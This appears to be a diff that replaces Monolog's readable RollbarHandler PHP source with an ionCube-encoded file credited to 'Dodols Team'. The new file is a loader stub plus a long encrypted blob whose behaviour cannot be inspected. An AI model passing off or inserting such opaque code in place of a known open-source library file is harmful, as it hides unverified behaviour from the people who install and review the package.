@@ -1,130 +1,69 @@
-<?php declare(strict_types=1);
-
-/*
- * This file is part of the Monolog package.
- *
- * (c) Jordi Boggiano <j.boggiano@seld.be>
- *
- * For the full copyright and license information, please view the LICENSE
- * file that was distributed with this source code.
- */
-
-namespace Monolog\Handler;
-
-use Rollbar\RollbarLogger;
-use Throwable;
-use Monolog\Logger;
-
-/**
- * Sends errors to Rollbar
- *
- * If the context data contains a `payload` key, that is used as an array
- * of payload options to RollbarLogger's log method.
- *
- * Rollbar's context info will contain the context + extra keys from the log record
- * merged, and then on top of that a few keys:
- *
- *  - level (rollbar level name)
- *  - monolog_level (monolog level name, raw level, as rollbar only has 5 but monolog 8)
- *  - channel
- *  - datetime (unix timestamp)
- *
- * @author Paul Statezny <paulstatezny@gmail.com>
- */
-class RollbarHandler extends AbstractProcessingHandler
-{
-    /**
-     * @var RollbarLogger
-     */
-    protected $rollbarLogger;
-
-    protected $levelMap = [
-        Logger::DEBUG     => 'debug',
-        Logger::INFO      => 'info',
-        Logger::NOTICE    => 'info',
-        Logger::WARNING   => 'warning',
-        Logger::ERROR     => 'error',
-        Logger::CRITICAL  => 'critical',
-        Logger::ALERT     => 'critical',
-        Logger::EMERGENCY => 'critical',
-    ];
-
-    /**
-     * Records whether any log records have been added since the last flush of the rollbar notifier
-     *
-     * @var bool
-     */
-    private $hasRecords = false;
-
-    protected $initialized = false;
-
-    /**
-     * @param RollbarLogger $rollbarLogger RollbarLogger object constructed with valid token
-     * @param string|int    $level         The minimum logging level at which this handler will be triggered
-     * @param bool          $bubble        Whether the messages that are handled can bubble up the stack or not
-     */
-    public function __construct(RollbarLogger $rollbarLogger, $level = Logger::ERROR, bool $bubble = true)
-    {
-        $this->rollbarLogger = $rollbarLogger;
-
-        parent::__construct($level, $bubble);
-    }
-
-    /**
-     * {@inheritdoc}
-     */
-    protected function write(array $record): void
-    {
-        if (!$this->initialized) {
-            // __destructor() doesn't get called on Fatal errors
-            register_shutdown_function(array($this, 'close'));
-            $this->initialized = true;
-        }
-
-        $context = $record['context'];
-        $context = array_merge($context, $record['extra'], [
-            'level' => $this->levelMap[$record['level']],
-            'monolog_level' => $record['level_name'],
-            'channel' => $record['channel'],
-            'datetime' => $record['datetime']->format('U'),
-        ]);
-
-        if (isset($context['exception']) && $context['exception'] instanceof Throwable) {
-            $exception = $context['exception'];
-            unset($context['exception']);
-            $toLog = $exception;
-        } else {
-            $toLog = $record['message'];
-        }
-
-        $this->rollbarLogger->log($context['level'], $toLog, $context);
-
-        $this->hasRecords = true;
-    }
-
-    public function flush(): void
-    {
-        if ($this->hasRecords) {
-            $this->rollbarLogger->flush();
-            $this->hasRecords = false;
-        }
-    }
-
-    /**
-     * {@inheritdoc}
-     */
-    public function close(): void
-    {
-        $this->flush();
-    }
-
-    /**
-     * {@inheritdoc}
-     */
-    public function reset()
-    {
-        $this->flush();
-
-        parent::reset();
-    }
-}
+<?php //00551
+// --------------------------
+// Created by Dodols Team
+// --------------------------
+if(!extension_loaded('ionCube Loader')){$__oc=strtolower(substr(php_uname(),0,3));$__ln='ioncube_loader_'.$__oc.'_'.substr(phpversion(),0,3).(($__oc=='win')?'.dll':'.so');if(function_exists('dl')){@dl($__ln);}if(function_exists('_il_exec')){return _il_exec();}$__ln='/ioncube/'.$__ln;$__oid=$__id=realpath(ini_get('extension_dir'));$__here=dirname(__FILE__);if(strlen($__id)>1&&$__id[1]==':'){$__id=str_replace('\\','/',substr($__id,2));$__here=str_replace('\\','/',substr($__here,2));}$__rd=str_repeat('/..',substr_count($__id,'/')).$__here.'/';$__i=strlen($__rd);while($__i--){if($__rd[$__i]=='/'){$__lp=substr($__rd,0,$__i).$__ln;if(file_exists($__oid.$__lp)){$__ln=$__lp;break;}}}if(function_exists('dl')){@dl($__ln);}}else{die('The file '.__FILE__." is corrupted.\n");}if(function_exists('_il_exec')){return _il_exec();}echo("Site error: the ".(php_sapi_name()=='cli'?'ionCube':'<a href="http://www.ioncube.com">ionCube</a>')." PHP Loader needs to be installed. This is a widely used PHP extension for running ionCube protected PHP code, website security and malware blocking.\n\nPlease visit ".(php_sapi_name()=='cli'?'get-loader.ioncube.com':'<a href="http://get-loader.ioncube.com">get-loader.ioncube.com</a>')." for install assistance.\n\n");exit(199);
+?>
+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
